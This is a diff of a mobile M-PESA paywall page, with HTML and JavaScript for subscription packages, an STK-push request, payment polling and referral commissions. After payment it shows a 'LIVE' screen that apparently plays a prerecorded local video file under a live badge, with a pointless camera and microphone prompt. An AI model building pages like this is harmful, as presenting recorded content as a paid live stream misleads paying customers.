@@ -1,12 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
- <style>
-/* Hide live chat only */
-.chat-panel,
-.center-chat {
-  display: none !important;
-}
- </style>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
@@ -26,22 +19,14 @@ button{cursor:pointer}
  background:radial-gradient(circle at top,#202020 0%,#0b0b0b 45%,#030303 100%)
 }
 .wrap{width:100%;max-width:520px;margin:auto}
-
 .header{text-align:center;margin-bottom:22px}
 .header h1{margin:5px 0 8px;font-size:30px;font-weight:900}
 .header p{margin:0;color:#999;font-size:14px}
-
 .secure{
- display:inline-flex;
- align-items:center;
- gap:6px;
- margin-top:12px;
- padding:8px 13px;
- border:1px solid #292929;
- border-radius:20px;
- background:#111;
- color:#bbb;
- font-size:12px
+ display:inline-flex;align-items:center;gap:6px;
+ margin-top:12px;padding:8px 13px;
+ border:1px solid #292929;border-radius:20px;
+ background:#111;color:#bbb;font-size:12px
 }
 
 .packages{
@@ -49,15 +34,11 @@ button{cursor:pointer}
  grid-template-columns:1fr 1fr;
  gap:12px
 }
-
 .package{
- position:relative;
- border:1px solid #292929;
- border-radius:18px;
- padding:18px 13px;
+ position:relative;border:1px solid #292929;
+ border-radius:18px;padding:18px 13px;
  background:linear-gradient(145deg,#171717,#0c0c0c);
- overflow:hidden;
- transition:.2s ease
+ overflow:hidden;transition:.2s ease
 }
 .package:active{transform:scale(.97)}
 .package.selected{
@@ -66,15 +47,9 @@ button{cursor:pointer}
  box-shadow:0 0 22px rgba(255,255,255,.10)
 }
 .badge{
- position:absolute;
- top:9px;
- right:9px;
- padding:4px 7px;
- border-radius:10px;
- background:#fff;
- color:#000;
- font-size:9px;
- font-weight:900
+ position:absolute;top:9px;right:9px;
+ padding:4px 7px;border-radius:10px;
+ background:#fff;color:#000;font-size:9px;font-weight:900
 }
 .minutes{margin-top:3px;font-size:24px;font-weight:900}
 .label{margin-top:2px;color:#aaa;font-size:12px}
@@ -83,311 +58,176 @@ button{cursor:pointer}
 .package.selected .select-text{color:#fff}
 
 .selected-box{
- margin-top:18px;
- padding:17px;
- border-radius:17px;
- background:#101010;
- border:1px solid #292929;
- text-align:center
+ margin-top:18px;padding:17px;border-radius:17px;
+ background:#101010;border:1px solid #292929;text-align:center
 }
 .selected-title{color:#999;font-size:12px}
 .selected-value{margin-top:5px;font-size:21px;font-weight:900}
 
 .payment-card{
- margin-top:14px;
- padding:20px;
- border-radius:19px;
- background:#111;
- border:1px solid #292929
+ margin-top:14px;padding:20px;border-radius:19px;
+ background:#111;border:1px solid #292929
 }
 .payment-title{text-align:center;font-size:20px;font-weight:900}
 .payment-subtitle{
- text-align:center;
- color:#999;
- font-size:12px;
- line-height:1.5;
- margin-top:7px
+ text-align:center;color:#999;font-size:12px;
+ line-height:1.5;margin-top:7px
 }
 .phone-label{
- display:block;
- margin-top:18px;
- margin-bottom:7px;
- color:#bbb;
- font-size:12px;
- font-weight:700
+ display:block;margin-top:18px;margin-bottom:7px;
+ color:#bbb;font-size:12px;font-weight:700
 }
 .phone-input{
- width:100%;
- border:1px solid #333;
- border-radius:13px;
- background:#080808;
- color:#fff;
- padding:15px;
- font-size:16px;
- outline:none
+ width:100%;border:1px solid #333;border-radius:13px;
+ background:#080808;color:#fff;padding:15px;
+ font-size:16px;outline:none
 }
 .phone-input:focus{border-color:#fff}
 .phone-hint{margin-top:7px;color:#777;font-size:11px}
 
 .prompt-button{
- width:100%;
- margin-top:14px;
- border:0;
- border-radius:14px;
- padding:17px;
- background:#20a943;
- color:#fff;
- font-size:16px;
- font-weight:900
+ width:100%;margin-top:14px;border:0;border-radius:14px;
+ padding:17px;background:#20a943;color:#fff;
+ font-size:16px;font-weight:900
 }
 .prompt-button:active{transform:scale(.98)}
 .prompt-button:disabled{opacity:.55;cursor:not-allowed}
 
 .status-card{
- margin-top:15px;
- padding:20px;
- border-radius:18px;
- background:#111;
- border:1px solid #292929;
- text-align:center
+ margin-top:15px;padding:20px;border-radius:18px;
+ background:#111;border:1px solid #292929;text-align:center
 }
 .status-icon{
- width:54px;
- height:54px;
- margin:0 auto 12px;
- border-radius:50%;
- display:flex;
- align-items:center;
- justify-content:center;
- background:#202020;
- font-size:25px
+ width:54px;height:54px;margin:0 auto 12px;border-radius:50%;
+ display:flex;align-items:center;justify-content:center;
+ background:#202020;font-size:25px
 }
 .status-title{font-size:19px;font-weight:900}
 .status-text{margin-top:8px;color:#999;font-size:13px;line-height:1.5}
-
 .spinner{
- width:30px;
- height:30px;
- margin:0 auto 13px;
- border:3px solid #333;
- border-top-color:#fff;
- border-radius:50%;
- animation:spin .8s linear infinite
+ width:30px;height:30px;margin:0 auto 13px;
+ border:3px solid #333;border-top-color:#fff;
+ border-radius:50%;animation:spin .8s linear infinite
 }
 @keyframes spin{to{transform:rotate(360deg)}}
 
 .failed-card{
- margin-top:15px;
- padding:24px 20px;
- border-radius:19px;
- background:#111;
- border:1px solid #3a1b1b;
- text-align:center
+ margin-top:15px;padding:24px 20px;border-radius:19px;
+ background:#111;border:1px solid #3a1b1b;text-align:center
 }
 .failed-icon{
- width:55px;
- height:55px;
- margin:0 auto 13px;
- border-radius:50%;
- display:flex;
- align-items:center;
- justify-content:center;
- background:#351010;
- color:#ff3838;
- font-size:26px;
- font-weight:900
+ width:55px;height:55px;margin:0 auto 13px;border-radius:50%;
+ display:flex;align-items:center;justify-content:center;
+ background:#351010;color:#ff3838;font-size:26px;font-weight:900
 }
 .failed-title{font-size:21px;font-weight:900}
 .failed-text{margin-top:9px;color:#999;font-size:13px;line-height:1.5}
 .retry-button{
- width:100%;
- margin-top:18px;
- padding:15px;
- border:0;
- border-radius:13px;
- background:#fff;
- color:#000;
- font-weight:900
+ width:100%;margin-top:18px;padding:15px;border:0;
+ border-radius:13px;background:#fff;color:#000;font-weight:900
 }
 
-/* LIVE */
+/* LIVE VIDEO */
 #liveScreen{min-height:100vh;background:#000;color:#fff}
 .live-header{
- height:55px;
- padding:0 14px;
- display:flex;
- align-items:center;
- justify-content:space-between;
- background:#090909;
- border-bottom:1px solid #202020
+ height:55px;padding:0 14px;display:flex;
+ align-items:center;justify-content:space-between;
+ background:#090909;border-bottom:1px solid #202020
 }
 .live-title{display:flex;align-items:center;gap:7px;font-size:16px;font-weight:900}
 .red-dot{
- width:9px;
- height:9px;
- border-radius:50%;
- background:#ff2020;
- box-shadow:0 0 12px #ff2020
+ width:9px;height:9px;border-radius:50%;
+ background:#ff2020;box-shadow:0 0 12px #ff2020
 }
 .viewer-count{color:#aaa;font-size:12px}
-
 .live-layout{
- width:100%;
- min-height:calc(100vh - 115px);
- display:grid;
- grid-template-columns:150px minmax(0,1fr) 150px;
- gap:5px;
- padding:5px
+ width:100%;min-height:calc(100vh - 115px);
+ display:grid;grid-template-columns:150px minmax(0,1fr) 150px;
+ gap:5px;padding:5px
 }
-
 .chat-panel{
- background:#0c0c0c;
- border:1px solid #1d1d1d;
- border-radius:8px;
- overflow:hidden;
- min-height:400px
+ background:#0c0c0c;border:1px solid #1d1d1d;
+ border-radius:8px;overflow:hidden;min-height:400px
 }
 .chat-title{
- padding:9px;
- border-bottom:1px solid #1d1d1d;
- color:#999;
- font-size:11px;
- font-weight:700
+ padding:9px;border-bottom:1px solid #1d1d1d;
+ color:#999;font-size:11px;font-weight:700
 }
 .chat-message{
- padding:6px 8px;
- font-size:10px;
- line-height:1.25;
+ padding:6px 8px;font-size:10px;line-height:1.25;
  border-bottom:1px solid #141414
 }
 .chat-name{font-weight:800;color:#fff;margin-right:3px}
 .chat-text{color:#aaa}
-
 .video-area{
- position:relative;
- min-width:0;
- min-height:500px;
- background:#000;
- border-radius:8px;
- overflow:hidden
+ position:relative;min-width:0;min-height:500px;
+ background:#000;border-radius:8px;overflow:hidden
 }
 #liveVideo{
- width:100%;
- height:100%;
- min-height:500px;
- object-fit:cover;
- display:block;
- background:#000
+ width:100%;height:100%;min-height:500px;
+ object-fit:cover;display:block;background:#000
 }
 .video-live-badge{
- position:absolute;
- top:12px;
- left:12px;
- z-index:10;
- display:flex;
- align-items:center;
- gap:6px;
- background:#e60000;
- color:#fff;
- padding:6px 10px;
- border-radius:6px;
- font-size:11px;
- font-weight:900
+ position:absolute;top:12px;left:12px;z-index:10;
+ display:flex;align-items:center;gap:6px;
+ background:#e60000;color:#fff;padding:6px 10px;
+ border-radius:6px;font-size:11px;font-weight:900
 }
 .video-live-badge span{
- width:6px;
- height:6px;
- background:#fff;
- border-radius:50%;
+ width:6px;height:6px;background:#fff;border-radius:50%;
  animation:livePulse 1s infinite
 }
 @keyframes livePulse{
  0%,100%{opacity:1;transform:scale(1)}
  50%{opacity:.4;transform:scale(.7)}
 }
-
 .bottom-live-bar{
- height:60px;
- padding:8px;
- background:#090909;
+ height:60px;padding:8px;background:#090909;
  border-top:1px solid #202020
 }
-.center-chat{width:100%;max-width:700px;margin:auto;display:flex;gap:7px}
+.center-chat{
+ width:100%;max-width:700px;margin:auto;display:flex;gap:7px
+}
 .center-chat input{
- flex:1;
- min-width:0;
- border:1px solid #292929;
- background:#151515;
- color:#fff;
- border-radius:12px;
- padding:12px;
- outline:none
+ flex:1;min-width:0;border:1px solid #292929;
+ background:#151515;color:#fff;border-radius:12px;
+ padding:12px;outline:none
 }
 .center-chat button{
- border:0;
- border-radius:12px;
- padding:0 16px;
- background:#fff;
- color:#000;
- font-weight:800
+ border:0;border-radius:12px;padding:0 16px;
+ background:#fff;color:#000;font-weight:800
 }
-
 .video-overlay{
- position:absolute;
- inset:0;
- z-index:20;
- display:flex;
- align-items:center;
- justify-content:center;
- background:rgba(0,0,0,.75);
- padding:20px
+ position:absolute;inset:0;z-index:20;
+ display:flex;align-items:center;justify-content:center;
+ background:rgba(0,0,0,.75);padding:20px
 }
 .permission-card{
- width:100%;
- max-width:330px;
- padding:25px 20px;
- border-radius:20px;
- background:#151515;
- border:1px solid #303030;
- text-align:center;
+ width:100%;max-width:330px;padding:25px 20px;
+ border-radius:20px;background:#151515;
+ border:1px solid #303030;text-align:center;
  box-shadow:0 20px 60px rgba(0,0,0,.7)
 }
 .permission-icon{font-size:43px;margin-bottom:13px}
 .permission-title{font-size:19px;font-weight:900}
 .permission-text{color:#999;font-size:13px;line-height:1.5;margin:10px 0 18px}
 .permission-button{
- width:100%;
- border:0;
- border-radius:13px;
- padding:14px;
- background:#fff;
- color:#000;
- font-weight:900;
- font-size:14px
+ width:100%;border:0;border-radius:13px;padding:14px;
+ background:#fff;color:#000;font-weight:900;font-size:14px
 }
-
 .video-error{
- position:absolute;
- left:0;
- right:0;
- bottom:0;
- z-index:30;
- min-height:115px;
- background:rgba(10,10,10,.97);
- border-top:1px solid #333;
- display:flex;
- align-items:center;
- justify-content:center;
- padding:15px
+ position:absolute;left:0;right:0;bottom:0;z-index:30;
+ min-height:115px;background:rgba(10,10,10,.97);
+ border-top:1px solid #333;display:flex;
+ align-items:center;justify-content:center;padding:15px
 }
 .video-error button{
- border:0;
- padding:12px 20px;
- border-radius:10px;
- background:#fff;
- color:#000;
- font-weight:800
+ border:0;padding:12px 20px;border-radius:10px;
+ background:#fff;color:#000;font-weight:800
 }
+
+/* Hide live chat panels */
+.chat-panel,.center-chat{display:none!important}
 
 @media(max-width:700px){
  .live-layout{grid-template-columns:1fr}
@@ -411,9 +251,11 @@ button{cursor:pointer}
 
 <div class="header">
 <h1>M-PESA PAYMENT</h1>
-<p>Choose your minutes and pay securely.</p>
+<p>Choose your subscription and pay securely.</p>
 <div class="secure">🔒 Secure M-PESA payment</div>
 </div>
+
+<!-- SUBSCRIPTION PACKAGES -->
 <div class="packages">
 
   <div class="package selected"
@@ -421,13 +263,11 @@ button{cursor:pointer}
        data-duration="7 Days"
        data-price="300"
        onclick="selectPackage(this)">
-
     <div class="badge">WEEKLY</div>
     <div class="minutes">7 Days</div>
     <div class="label">WEEKLY SUBSCRIPTION</div>
     <div class="price">KSh 300</div>
     <div class="select-text">Tap to select</div>
-
   </div>
 
   <div class="package"
@@ -435,13 +275,11 @@ button{cursor:pointer}
        data-duration="3 Days"
        data-price="199"
        onclick="selectPackage(this)">
-
     <div class="badge">POPULAR</div>
     <div class="minutes">3 Days</div>
     <div class="label">ACTIVE FOR 3 DAYS</div>
     <div class="price">KSh 199</div>
     <div class="select-text">Tap to select</div>
-
   </div>
 
   <div class="package"
@@ -449,20 +287,23 @@ button{cursor:pointer}
        data-duration="1 Day"
        data-price="100"
        onclick="selectPackage(this)">
-
     <div class="minutes">1 Day</div>
     <div class="label">ACTIVE FOR 1 DAY</div>
     <div class="price">KSh 100</div>
     <div class="select-text">Tap to select</div>
-
   </div>
 
 </div>
 
+<div class="selected-box">
+  <div class="selected-title">SELECTED PACKAGE</div>
+  <div id="selectedValue" class="selected-value">
+    Weekly Subscription — KSh 300
+  </div>
+</div>
+
 <div class="payment-card">
-
 <div class="payment-title">Pay with M-PESA</div>
-
 <div class="payment-subtitle">
 Enter your Safaricom number and we will send an M-PESA payment prompt to your phone.
 </div>
@@ -490,7 +331,6 @@ class="prompt-button"
 onclick="sendMpesaPrompt()">
 💳 SEND M-PESA PROMPT
 </button>
-
 </div>
 
 <div id="statusCard" class="status-card hidden">
@@ -532,7 +372,6 @@ LIVE
 </div>
 
 <div class="video-area">
-
 <video
 id="liveVideo"
 playsinline
@@ -546,18 +385,14 @@ LIVE
 </div>
 
 <div id="videoOverlay" class="video-overlay">
-
 <div class="permission-card">
 <div class="permission-icon">📹</div>
-
 <div id="permissionTitle" class="permission-title">
 Camera permission required
 </div>
-
 <div id="permissionText" class="permission-text">
 Allow camera and microphone access to continue.
 </div>
-
 <button
 id="permissionButton"
 class="permission-button"
@@ -565,11 +400,9 @@ onclick="requestCameraPermission()">
 CONTINUE
 </button>
 </div>
-
 </div>
 
 <div id="videoError" class="video-error hidden"></div>
-
 </div>
 
 <div class="chat-panel">
@@ -581,26 +414,23 @@ CONTINUE
 
 <div class="bottom-live-bar">
 <div class="center-chat">
-
 <input
 id="centerChatInput"
 type="text"
 placeholder="Say something..."
 autocomplete="off">
-
 <button onclick="sendCenterMessage()">SEND</button>
-
 </div>
 </div>
 
- </section>
- <script>
+</section>
 
-const LIVE_VIDEO_URL =
-"IMG_20261001_112122_071.mp4";
+<script>
+ const LIVE_VIDEO_URL = "IMG_20261001_112122_071.mp4";
 
-let selectedMinutes = 30;
-let selectedPrice = 95;
+let selectedPackageLabel = "Weekly Subscription";
+let selectedMinutes = "7 Days";
+let selectedPrice = 300;
 
 let transactionId = "";
 let paymentReference = "";
@@ -613,1567 +443,1039 @@ let chatTimer = null;
 let permissionStream = null;
 let videoEndedTimer = null;
 
+/* EMPLOYEE / REFERRAL */
 
-/* ================================
-   EMPLOYEE / REFERRAL
-================================ */
+const urlParams = new URLSearchParams(window.location.search);
 
-const urlParams =
-new URLSearchParams(window.location.search);
+const employee = urlParams.get("employee") || "";
+const ref = urlParams.get("ref") || "";
 
-const employee =
-urlParams.get("employee") || "";
+/* ELEMENTS */
 
-const ref =
-urlParams.get("ref") || "";
+const paymentPage = document.getElementById("paymentPage");
+const liveScreen = document.getElementById("liveScreen");
+const selectedValue = document.getElementById("selectedValue");
+const phoneInput = document.getElementById("phoneInput");
+const promptButton = document.getElementById("promptButton");
 
+const statusCard = document.getElementById("statusCard");
+const statusSpinner = document.getElementById("statusSpinner");
+const statusIcon = document.getElementById("statusIcon");
+const statusTitle = document.getElementById("statusTitle");
+const statusText = document.getElementById("statusText");
 
-/* ================================
-   ELEMENTS
-================================ */
+const failedCard = document.getElementById("failedCard");
+const failedText = document.getElementById("failedText");
 
-const paymentPage =
-document.getElementById("paymentPage");
+const liveVideo = document.getElementById("liveVideo");
+const videoOverlay = document.getElementById("videoOverlay");
+const permissionTitle = document.getElementById("permissionTitle");
+const permissionText = document.getElementById("permissionText");
+const permissionButton = document.getElementById("permissionButton");
+const videoError = document.getElementById("videoError");
 
-const liveScreen =
-document.getElementById("liveScreen");
+/* PACKAGE SELECTION */
 
-const selectedValue =
-document.getElementById("selectedValue");
+function selectPackage(element) {
 
-const phoneInput =
-document.getElementById("phoneInput");
+  if (!statusCard.classList.contains("hidden")) return;
+  if (!failedCard.classList.contains("hidden")) return;
 
-const promptButton =
-document.getElementById("promptButton");
+  document.querySelectorAll(".package").forEach(function(item) {
+    item.classList.remove("selected");
+  });
 
-const statusCard =
-document.getElementById("statusCard");
+  element.classList.add("selected");
 
-const statusSpinner =
-document.getElementById("statusSpinner");
+  selectedPackageLabel = element.dataset.label;
+  selectedMinutes = element.dataset.duration;
+  selectedPrice = Number(element.dataset.price);
 
-const statusIcon =
-document.getElementById("statusIcon");
-
-const statusTitle =
-document.getElementById("statusTitle");
-
-const statusText =
-document.getElementById("statusText");
-
-const failedCard =
-document.getElementById("failedCard");
-
-const failedText =
-document.getElementById("failedText");
-
-const liveVideo =
-document.getElementById("liveVideo");
-
-const videoOverlay =
-document.getElementById("videoOverlay");
-
-const permissionTitle =
-document.getElementById("permissionTitle");
-
-const permissionText =
-document.getElementById("permissionText");
-
-const permissionButton =
-document.getElementById("permissionButton");
-
-const videoError =
-document.getElementById("videoError");
-
-
-/* ================================
-   PACKAGE SELECTION
-================================ */
-
-function selectPackage(element){
-
-if(!statusCard.classList.contains("hidden")){
-return;
+  selectedValue.textContent =
+    selectedPackageLabel + " — KSh " + selectedPrice;
 }
 
-if(!failedCard.classList.contains("hidden")){
-return;
+/* PHONE CLEANING */
+
+function cleanPhone(value) {
+  return String(value || "")
+    .replace(/\D/g, "")
+    .trim();
 }
 
-document.querySelectorAll(".package").forEach(function(item){
-item.classList.remove("selected");
-});
+function normalizePhone(value) {
 
-element.classList.add("selected");
+  const raw = cleanPhone(value);
 
-selectedMinutes =
-Number(element.dataset.minutes);
+  if (/^01\d{8}$/.test(raw)) {
+    return "254" + raw.substring(1);
+  }
 
-selectedPrice =
-Number(element.dataset.price);
+  if (/^07\d{8}$/.test(raw)) {
+    return "254" + raw.substring(1);
+  }
 
-selectedValue.textContent =
-selectedMinutes +
-" Minutes — KSh " +
-selectedPrice;
+  if (/^2541\d{8}$/.test(raw)) {
+    return raw;
+  }
+
+  if (/^2547\d{8}$/.test(raw)) {
+    return raw;
+  }
+
+  if (/^1\d{8}$/.test(raw)) {
+    return "254" + raw;
+  }
+
+  if (/^7\d{8}$/.test(raw)) {
+    return "254" + raw;
+  }
+
+  return "";
 }
 
+/* UNIQUE PAYMENT REFERENCE */
 
-/* ================================
-   PHONE CLEANING
-================================ */
+function createReference() {
 
-function cleanPhone(value){
+  const prefix = employee || ref || "LIVE";
 
-return String(value || "")
-.replace(/\D/g,"")
-.trim();
+  const cleanPrefix = String(prefix)
+    .replace(/[^A-Za-z0-9]/g, "")
+    .slice(0, 8);
 
+  const randomPart = Math.floor(
+    100000 + Math.random() * 900000
+  );
+
+  return (
+    "LIVE" +
+    cleanPrefix +
+    Date.now().toString().slice(-6) +
+    randomPart.toString().slice(-4)
+  ).slice(0, 20);
 }
 
+/* SEND M-PESA PROMPT */
 
-/*
-ACCEPT:
+async function sendMpesaPrompt() {
 
-01XXXXXXXX
-07XXXXXXXX
-2541XXXXXXXX
-2547XXXXXXXX
-1XXXXXXXX
-7XXXXXXXX
-*/
+  if (promptButton.disabled) return;
 
-function normalizePhone(value){
+  const phone = normalizePhone(phoneInput.value);
 
-const raw = cleanPhone(value);
+  if (!phone) {
+    phoneInput.focus();
 
+    showFailed(
+      "Enter a valid M-PESA number starting with 01 or 07."
+    );
 
-/* 01XXXXXXXX */
+    return;
+  }
 
-if(/^01\d{8}$/.test(raw)){
+  const reference = createReference();
+  paymentReference = reference;
 
-return "254" +
-raw.substring(1);
+  promptButton.disabled = true;
+  promptButton.textContent = "SENDING PROMPT...";
 
+  failedCard.classList.add("hidden");
+  statusCard.classList.remove("hidden");
+
+  statusSpinner.classList.remove("hidden");
+  statusIcon.classList.add("hidden");
+
+  statusTitle.textContent = "Sending M-PESA prompt";
+
+  statusText.textContent =
+    "Please wait while we send the payment request to your phone.";
+
+  try {
+
+    const response = await fetch("/api/stk-push", {
+
+      method: "POST",
+
+      headers: {
+        "Content-Type": "application/json"
+      },
+
+      body: JSON.stringify({
+        phone: phone,
+        amount: selectedPrice,
+        reference: reference
+      })
+
+    });
+
+    const data = await response.json().catch(function() {
+      return {};
+    });
+
+    if (
+      !response.ok ||
+      data.success !== true ||
+      !(
+        data.transaction_id ||
+        data.transaction_request_id ||
+        data.paymentId
+      )
+    ) {
+
+      showFailed(
+        data.message || "Unable to send the M-PESA prompt."
+      );
+
+      return;
+    }
+
+    transactionId = String(
+      data.transaction_id ||
+      data.transaction_request_id ||
+      data.paymentId
+    );
+
+    statusAttempts = 0;
+
+    statusTitle.textContent = "Check your phone";
+
+    statusText.textContent =
+      "M-PESA prompt sent. Enter your M-PESA PIN on your phone to complete the payment.";
+
+    startPaymentStatusCheck();
+
+  } catch (error) {
+
+    console.error("STK ERROR:", error);
+
+    showFailed(
+      "Unable to start the M-PESA payment. Please try again."
+    );
+
+  }
 }
 
+/* PAYMENT STATUS TIMER */
 
-/* 07XXXXXXXX */
+function startPaymentStatusCheck() {
 
-if(/^07\d{8}$/.test(raw)){
+  stopStatusCheck();
 
-return "254" +
-raw.substring(1);
+  statusAttempts = 0;
 
+  checkPaymentStatus();
+
+  statusTimer = setInterval(
+    checkPaymentStatus,
+    3000
+  );
 }
 
+function stopStatusCheck() {
 
-/* 2541XXXXXXXX */
-
-if(/^2541\d{8}$/.test(raw)){
-
-return raw;
-
+  if (statusTimer) {
+    clearInterval(statusTimer);
+    statusTimer = null;
+  }
 }
 
+/* CHECK PAYMENT STATUS */
 
-/* 2547XXXXXXXX */
+async function checkPaymentStatus() {
 
-if(/^2547\d{8}$/.test(raw)){
+  if (!transactionId) return;
 
-return raw;
+  statusAttempts++;
 
+  if (statusAttempts > 40) {
+
+    stopStatusCheck();
+
+    showFailed(
+      "The payment confirmation timed out. Please check your M-PESA message and try again."
+    );
+
+    return;
+  }
+
+  try {
+
+    const response = await fetch("/api/payment-status", {
+
+      method: "POST",
+
+      headers: {
+        "Content-Type": "application/json"
+      },
+
+      body: JSON.stringify({
+
+        transaction_id: transactionId,
+
+        transaction_request_id: transactionId,
+
+        reference: paymentReference,
+
+        employee: employee,
+
+        ref: ref
+
+      })
+
+    });
+
+    const data = await response.json().catch(function() {
+      return {};
+    });
+
+    if (
+      data.success === true &&
+      data.paid === true
+    ) {
+
+      stopStatusCheck();
+
+      paymentConfirmed();
+
+      return;
+    }
+
+    const currentStatus = String(
+      data.status || ""
+    ).toLowerCase();
+
+    if (
+      currentStatus === "failed" ||
+      currentStatus === "cancelled" ||
+      currentStatus === "rejected"
+    ) {
+
+      stopStatusCheck();
+
+      showFailed(
+        data.message || "The M-PESA payment was not completed."
+      );
+
+      return;
+    }
+
+    statusTitle.textContent = "Waiting for payment";
+
+    statusText.textContent =
+      "Please complete the M-PESA prompt on your phone. We are checking the payment automatically.";
+
+  } catch (error) {
+
+    console.log("STATUS CHECK ERROR:", error);
+
+    statusText.textContent =
+      "Still checking your M-PESA payment...";
+
+  }
 }
 
+/* PAYMENT CONFIRMED */
 
-/* 1XXXXXXXX */
+async function paymentConfirmed() {
 
-if(/^1\d{8}$/.test(raw)){
+  statusCard.classList.remove("hidden");
 
-return "254" + raw;
+  statusSpinner.classList.add("hidden");
+  statusIcon.classList.remove("hidden");
 
+  statusIcon.textContent = "✓";
+
+  statusTitle.textContent = "Payment confirmed";
+
+  statusText.textContent =
+    "Payment successful. Opening your live video...";
+
+  promptButton.disabled = true;
+
+  /*
+    EMPLOYEE COMMISSION REQUEST
+    The existing commission endpoint is retained.
+  */
+
+  if (employee || ref) {
+
+    try {
+
+      const commissionResponse = await fetch(
+        "/api/employee-commission",
+        {
+
+          method: "POST",
+
+          headers: {
+            "Content-Type": "application/json"
+          },
+
+          body: JSON.stringify({
+
+            transaction_id: transactionId,
+
+            employeeId: employee || ref,
+
+            referral: employee || ref
+
+          })
+
+        }
+      );
+
+      const commissionData =
+        await commissionResponse.json().catch(function() {
+          return {};
+        });
+
+      console.log(
+        "EMPLOYEE COMMISSION RESULT:",
+        commissionData
+      );
+
+      if (!commissionResponse.ok) {
+
+        console.error(
+          "Commission recording failed:",
+          commissionData
+        );
+
+      }
+
+    } catch (error) {
+
+      console.error("COMMISSION ERROR:", error);
+
+    }
+  }
+
+  /* OPEN LIVE AFTER VERIFIED PAYMENT */
+
+  setTimeout(function() {
+    openLiveAfterPayment();
+  }, 1200);
 }
 
+/* FAILED PAYMENT */
 
-/* 7XXXXXXXX */
+function showFailed(message) {
 
-if(/^7\d{8}$/.test(raw)){
+  stopStatusCheck();
 
-return "254" + raw;
+  statusCard.classList.add("hidden");
+  failedCard.classList.remove("hidden");
 
+  failedText.textContent =
+    message || "We could not confirm your M-PESA payment.";
+
+  promptButton.disabled = false;
+
+  promptButton.textContent =
+    "💳 SEND M-PESA PROMPT";
 }
 
-return "";
+/* TRY AGAIN */
 
+function resetPayment() {
+
+  stopStatusCheck();
+
+  transactionId = "";
+  paymentReference = "";
+  statusAttempts = 0;
+
+  statusCard.classList.add("hidden");
+  failedCard.classList.add("hidden");
+
+  promptButton.disabled = false;
+
+  promptButton.textContent =
+    "💳 SEND M-PESA PROMPT";
+
+  phoneInput.value = "";
+  phoneInput.focus();
 }
 
+/* OPEN LIVE */
 
-/* ================================
-   UNIQUE PAYMENT REFERENCE
-================================ */
+function openLiveAfterPayment() {
 
-function createReference(){
+  paymentPage.classList.add("hidden");
 
-const prefix =
-employee ||
-ref ||
-"LIVE";
+  failedCard.classList.add("hidden");
+  statusCard.classList.add("hidden");
 
-const cleanPrefix =
-String(prefix)
-.replace(/[^A-Za-z0-9]/g,"")
-.slice(0,8);
+  liveScreen.classList.remove("hidden");
 
-const randomPart =
-Math.floor(
-100000 +
-Math.random() * 900000
-);
+  liveStarted = true;
 
-return (
-"LIVE" +
-cleanPrefix +
-Date.now().toString().slice(-6) +
-randomPart.toString().slice(-4)
-).slice(0,20);
+  showVideoOverlay(
+    "Camera permission required",
+    "Allow camera and microphone access to continue."
+  );
+}
+ /* CAMERA PERMISSION */
 
+async function requestCameraPermission() {
+
+  permissionButton.disabled = true;
+  permissionButton.textContent = "ALLOWING...";
+
+  if (
+    !navigator.mediaDevices ||
+    !navigator.mediaDevices.getUserMedia
+  ) {
+
+    permissionButton.disabled = false;
+    permissionButton.textContent = "CONTINUE";
+
+    hideVideoOverlay();
+    startLiveVideo();
+    startLiveChat();
+
+    return;
+  }
+
+  try {
+
+    permissionStream =
+      await navigator.mediaDevices.getUserMedia({
+        video: true,
+        audio: true
+      });
+
+    permissionStream
+      .getTracks()
+      .forEach(function(track) {
+        track.stop();
+      });
+
+    permissionStream = null;
+
+    hideVideoOverlay();
+    startLiveVideo();
+    startLiveChat();
+
+  } catch (error) {
+
+    console.log("Camera permission error:", error);
+
+    permissionButton.disabled = false;
+    permissionButton.textContent = "CONTINUE";
+
+    permissionText.textContent =
+      "Camera access was not granted. Tap CONTINUE to watch the live video.";
+
+    permissionButton.onclick = function() {
+
+      hideVideoOverlay();
+      startLiveVideo();
+      startLiveChat();
+
+    };
+  }
 }
 
+/* VIDEO OVERLAY */
 
-/* ================================
-   SEND M-PESA PROMPT
-================================ */
+function showVideoOverlay(title, text) {
 
-async function sendMpesaPrompt(){
+  videoOverlay.classList.remove("hidden");
 
-if(promptButton.disabled){
-return;
+  permissionTitle.textContent = title;
+  permissionText.textContent = text;
+
+  permissionButton.disabled = false;
+  permissionButton.textContent = "CONTINUE";
+
+  permissionButton.onclick = requestCameraPermission;
 }
 
-const phone =
-normalizePhone(phoneInput.value);
-
-if(!phone){
-
-phoneInput.focus();
-
-showFailed(
-"Enter a valid M-PESA number starting with 01 or 07."
-);
-
-return;
+function hideVideoOverlay() {
+  videoOverlay.classList.add("hidden");
 }
 
+/* START VIDEO */
 
-/*
-SAVE THE SAME REFERENCE
-FOR PAYMENT STATUS + COMMISSION
-*/
+function startLiveVideo() {
 
-const reference =
-createReference();
+  videoError.classList.add("hidden");
 
-paymentReference =
-reference;
+  if (videoEndedTimer) {
+    clearTimeout(videoEndedTimer);
+    videoEndedTimer = null;
+  }
 
-promptButton.disabled = true;
+  liveVideo.src = LIVE_VIDEO_URL;
+  liveVideo.controls = false;
+  liveVideo.muted = false;
+  liveVideo.playsInline = true;
 
-promptButton.textContent =
-"SENDING PROMPT...";
+  liveVideo.load();
 
-failedCard.classList.add("hidden");
+  const playPromise = liveVideo.play();
 
-statusCard.classList.remove("hidden");
+  if (
+    playPromise &&
+    typeof playPromise.catch === "function"
+  ) {
 
-statusSpinner.classList.remove("hidden");
+    playPromise.catch(function() {
 
-statusIcon.classList.add("hidden");
+      showVideoOverlay(
+        "Tap to continue",
+        "Tap CONTINUE to start the live video."
+      );
 
-statusTitle.textContent =
-"Sending M-PESA prompt";
+      permissionButton.onclick = function() {
 
-statusText.textContent =
-"Please wait while we send the payment request to your phone.";
+        hideVideoOverlay();
 
-try{
+        const attempt = liveVideo.play();
 
-const response =
-await fetch("/api/stk-push",{
-
-method:"POST",
-
-headers:{
-"Content-Type":"application/json"
-},
-
-body:JSON.stringify({
-
-phone:phone,
-
-amount:selectedPrice,
-
-reference:reference
-
-})
-
-});
-
-const data =
-await response.json().catch(function(){
-
-return {};
-
-});
-
-
-/*
-TRANSACTION ID REQUIRED
-*/
-
-if(
-!response.ok ||
-data.success !== true ||
-!(
-data.transaction_id ||
-data.transaction_request_id ||
-data.paymentId
-)
-){
-
-showFailed(
-data.message ||
-"Unable to send the M-PESA prompt."
-);
-
-return;
+        if (attempt && attempt.catch) {
+          attempt.catch(function() {
